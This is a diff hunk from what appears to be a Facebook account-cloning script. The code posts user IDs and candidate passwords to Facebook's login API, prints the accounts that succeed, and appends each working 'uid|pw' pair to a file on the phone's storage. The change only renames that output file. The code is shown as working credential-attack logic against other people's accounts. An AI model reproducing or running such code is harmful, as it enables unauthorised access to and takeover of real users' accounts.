@@ -451,7 +451,7 @@ def login_1(uid):
             res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
             if 'session_key' in res:
                 print(f"\n {W}=> {G}{uid} {W}=> {G}{pw} {W}=> {G}{creationyear(uid)}")
-                open('/sdcard/RAJA-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
+                open('/sdcard/GAB-CLONE-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                 oks.append(uid)
                 break
             elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
